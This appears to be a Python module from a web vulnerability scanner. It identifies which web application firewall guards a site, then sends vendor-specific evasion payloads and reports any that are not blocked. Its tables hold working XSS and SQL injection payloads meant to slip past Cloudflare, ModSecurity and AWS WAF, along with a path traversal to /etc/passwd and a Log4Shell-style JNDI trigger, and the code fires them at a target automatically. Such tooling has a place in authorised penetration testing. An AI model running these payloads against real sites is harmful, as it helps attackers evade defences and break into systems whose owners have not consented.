"""WAF Fingerprint & Bypass — detect WAF vendor + auto-generate bypass payloads."""

import aiohttp
import asyncio
import re
from modules.core import console

WAF_SIGNATURES = {
    'Cloudflare': {'headers': ['cf-ray', 'cf-cache-status'], 'body': ['cloudflare', 'attention required', 'ray id']},
    'AWS WAF': {'headers': ['x-amzn-requestid'], 'body': ['aws', 'request blocked']},
    'Akamai': {'headers': ['x-akamai-transformed'], 'body': ['akamai', 'reference #']},
    'Imperva': {'headers': ['x-cdn', 'x-iinfo'], 'body': ['incapsula', 'imperva', '_incap_']},
    'ModSecurity': {'headers': ['mod_security'], 'body': ['mod_security', 'modsecurity', 'owasp']},
    'Sucuri': {'headers': ['x-sucuri-id'], 'body': ['sucuri', 'sucuri website firewall']},
    'F5 BIG-IP': {'headers': ['bigipserver'], 'body': ['f5', 'the requested url was rejected']},
    'Wordfence': {'headers': [], 'body': ['wordfence', 'generated by wordfence']},
    'LiteSpeed': {'headers': ['x-litespeed-cache'], 'body': ['litespeed']},
    'Barracuda': {'headers': ['barra_counter_session'], 'body': ['barracuda']},
}

TRIGGERS = ["<script>alert(1)</script>", "' OR 1=1--", "../../etc/passwd", "${jndi:ldap://x}"]

BYPASSES = {
    'Cloudflare': [('<svg/onload=alert(1)>', 'SVG'), ('<details open ontoggle=alert(1)>', 'Details'),
                   ("' /*!50000OR*/ 1=1--", 'MySQL comment'), ('%3Csvg%20onload%3Dalert(1)%3E', 'URL encode')],
    'ModSecurity': [('<svg/onload=confirm(1)>', 'Alt JS'), ("' OR '1'LIKE'1", 'LIKE SQLi'),
                    ("<img src=x oNeRrOr=alert(1)>", 'Mixed case')],
    'AWS WAF': [('<svg onload=alert(1)>', 'SVG'), ("'+OR+1=1--", 'Plus encode'),
                ('<details/open/ontoggle=alert`1`>', 'Template literal')],
    'default': [('<img src=x onerror=alert(1)>', 'Basic XSS'), ("' OR ''='", 'Basic SQLi'),
                ('<svg/onload=alert(1)>', 'SVG'), ('<details open ontoggle=alert(1)>', 'HTML5')],
}


async def _fingerprint(session, url):
    detected = []
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
            hl = {k.lower(): v.lower() for k, v in resp.headers.items()}
            for name, sigs in WAF_SIGNATURES.items():
                for h in sigs['headers']:
                    if h.lower() in hl:
                        detected.append({'name': name, 'via': f'Header: {h}', 'confidence': 90})
                        break
    except Exception:
        pass
    for trigger in TRIGGERS[:3]:
        try:
            async with session.get(url, params={'t': trigger}, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
                body = (await resp.text()).lower()
                for name, sigs in WAF_SIGNATURES.items():
                    if name in [d['name'] for d in detected]:
                        continue
                    for ind in sigs['body']:
                        if ind.lower() in body:
                            detected.append({'name': name, 'via': f'Body: {ind}', 'confidence': 85})
                            break
        except Exception:
            pass
    return detected


async def _test_bypass(session, url, waf):
    findings = []
    techs = BYPASSES.get(waf, BYPASSES['default'])
    for payload, desc in techs:
        try:
            async with session.get(url, params={'q': payload},
                                   timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
                if resp.status not in (403, 406):
                    findings.append({'type': f'WAF Bypass: {desc}', 'waf': waf,
                                     'payload': payload[:50], 'severity': 'Critical'})
        except Exception:
            pass
    return findings


async def scan_waf_bypass(session, url):
    console.print(f"\n[bold cyan]--- WAF Fingerprint & Bypass ---[/bold cyan]")
    console.print(f"  [cyan]Fingerprinting ({len(WAF_SIGNATURES)} WAFs)...[/cyan]")
    wafs = await _fingerprint(session, url)
    all_f = []
    if wafs:
        for w in wafs:
            console.print(f"  [yellow]Detected: {w['name']} ({w['confidence']}%)[/yellow]")
            all_f.append({'type': f'WAF: {w["name"]}', 'severity': 'Info', 'confidence': w['confidence']})
        for w in wafs:
            console.print(f"  [cyan]Bypassing {w['name']}...[/cyan]")
            b = await _test_bypass(session, url, w['name'])
            all_f.extend(b)
            for f in b:
                console.print(f"  [bold red]⚠ {f['type']}[/bold red]")
    else:
        console.print(f"  [dim]No WAF — testing defaults...[/dim]")
        all_f.extend(await _test_bypass(session, url, 'default'))
    if not any(f['severity'] == 'Critical' for f in all_f):
        console.print(f"\n  [green]✓ No bypasses found[/green]")
    return {'wafs': wafs, 'findings': all_f}
